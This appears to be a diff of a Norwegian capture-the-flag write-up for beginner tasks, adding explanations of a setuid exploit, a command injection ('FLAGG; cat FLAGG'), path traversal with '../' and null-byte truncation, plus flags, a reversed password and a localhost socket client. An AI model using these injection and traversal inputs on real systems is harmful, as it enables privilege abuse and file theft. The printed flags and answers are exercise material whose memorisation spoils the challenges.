@@ -1,7 +1,7 @@
 ## Grunnleggende
 
 ### 1.1_scoreboard
-Intro oppgave
+Intro oppgave, scoreboard FLAGG er kommandoen for å få poeng.
 ```
 login@corax:~/1_grunnleggende/1_scoreboard$ cat FLAGG
 For å løse denne oppgaven må du skrive:
@@ -21,6 +21,9 @@ Gratulerer, korrekt svar!
 ```
 
 ### 1.2_setuid
+
+Som vist i output til ls -la kan har vi rettigheter til å kjøre cat programmet med rettigheter (set-uid) til basic2. Vi kan med det programmet lese flagget.
+
 ```
 login@corax:~/1_grunnleggende/2_setuid$ cat FLAGG
 cat: FLAGG: Permission denied
@@ -52,7 +55,7 @@ Gratulerer, korrekt svar!
 ```
 
 ### 1.3_injection
-
+md5sum er også et set-uid program, det kjører med rettigheter til basic3. md5sum tar imot ett argument, men vi kan komme rundt det ved å sende inn som en streng. ; operatoren i bash fungerer som en "sekvensiell" kommando. så først blir md5sum av flagg kjørt ; så med rettighetene til basic3 kjører vi lesing av flagget.
 ```
 login@corax:~/1_grunnleggende/3_injection$ ./md5sum "FLAGG; cat FLAGG"
 Kjører kommando:
@@ -136,8 +139,82 @@ Svar:     dbb5c2b12d9d494c63053011bb4e1e04
 Poeng:    10
 
 Gratulerer, korrekt svar!
-### 1.6_reversing 
 
+```
+
+### 1.5_nettverk 
+
+```
+login@corax:~$ ./1.6_client.py
+Dette er en grunnleggende introduksjon til nettverksprogrammering.
+Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.
+
+Du vil nå få tilsendt et 32-bits heltall i `network byte order` i hver av de ti andre sesjonene.
+Summer alle, og send resultatet tilbake på denne socketen.
+Det er mange måter å konvertere data på. En av dem er `struct.unpack`.
+
+Neste melding sendes fordelt over de ti sesjonene.
+For å unngå å blokkere mens du leser kan du for eksempel bruke `select.select()` eller `socket.settimeout(0)`.
+
+Husk at utf-8 kan ha multi-byte tegn 😊
+
+╭────────────────────────────────────────╮
+│ Gratulerer!                            │
+│                                        │
+│ Her er flagget:                        │
+│                                        │
+├────────────────────────────────────────┤
+│    85dabd2b27904358bab2eccbd16dcba4    │
+╰────────────────────────────────────────╯
+
+login@corax:~$ scoreboard 85dabd2b27904358bab2eccbd16dcba4
+Kategori: 1. Grunnleggende
+Oppgave:  1.5_nettverk
+Svar:     85dabd2b27904358bab2eccbd16dcba4
+Poeng:    10
+
+Gratulerer, korrekt svar!
+```
+
+1.6_client.py
+```
+#!/usr/bin/env python3
+
+import socket
+import struct
+import select
+
+TCP_IP = "127.0.0.1"
+TCP_PORT = 10015
+
+
+def main():
+    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.connect((TCP_IP, TCP_PORT))
+    print(conn.recv(4096).decode("utf-8"))
+
+    conns = [None] * 10
+    for idx, con in enumerate(conns):
+        conns[idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conns[idx].connect((TCP_IP, TCP_PORT))
+    print(conn.recv(4096).decode("utf-8"))
+
+    sum = 0
+    for con in conns:
+        sum = sum + struct.unpack('!i', con.recv(32))[0]
+    conn.send(struct.pack('!i',sum))
+    print(conn.recv(4096).decode("utf-8"))
+
+    while True:
+        unblockeds = select.select(conns, list(), list())[0]
+        if not unblockeds:
+            break
+        for sock in unblockeds:
+            print(sock.recv(1024).decode(), end="")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### 1.6_reversing
@@ -164,6 +241,7 @@ La oss ta check_password binaryen for en nærmere inspeksjon i Ghidra
 ```
 lokalt $ scp etj:~/1_grunnleggende/6_reversing/check_password .
 ```
+når vi åpner programmet i ghidra ser vi rekkefølgen passordet forventes å bli lest i. ved å følge kodelogikken er passordet "Reverse_engineering_er_morsomt__" 
 
 ```
 login@corax:~/1_grunnleggende/6_reversing$ ./check_password Reverse_engineering_er_morsomt__
@@ -182,6 +260,7 @@ Poeng:    10
 Gratulerer, korrekt svar!
 ```
 ### 1.7_path_traversal
+les_bok bruker setuid til eieren av flagget. vi kan utnytte det programmet til å path traverse (med ..) til directoryet til flagget og lese det.
 ```
 login@corax:~/1_grunnleggende/7_path_traversal$ ./les_bok ../FLAGG
 
@@ -194,6 +273,7 @@ Gratulerer, korrekt svar!
 ```
 
 ### 1.8_path_traversal_bonus
+les_bok programmet legger til en hardkodet .txt ending på filinput. nøkkelen her er å avbryte den lesingen med en nullbyte.
 ```
 login@corax:~/1_grunnleggende/7_path_traversal$ ./les_bok ../BONUS_FLAGG%00
 FLAGG: e012ffcf5dc95e37bea6ef6d62c726d5
@@ -295,12 +375,10 @@ Poeng:    10
 Bra jobba! Dette er trening som du kan trenge senere.
 ```
 
-## Utfordringer 
-
 ## Skjulte flagg
 
 ### 4_corax_dev_shm
-Fant dette flagget i fjor ved find commandoen under rekoginisering. Det er tilgjengelig i år også.
+Fant dette flagget i fjor ved find kommandoen under rekoginisering av corax. Det er tilgjengelig i år også.
 ```
 $ find / -name .secret 2>/dev/null
 /dev/shm/.secret
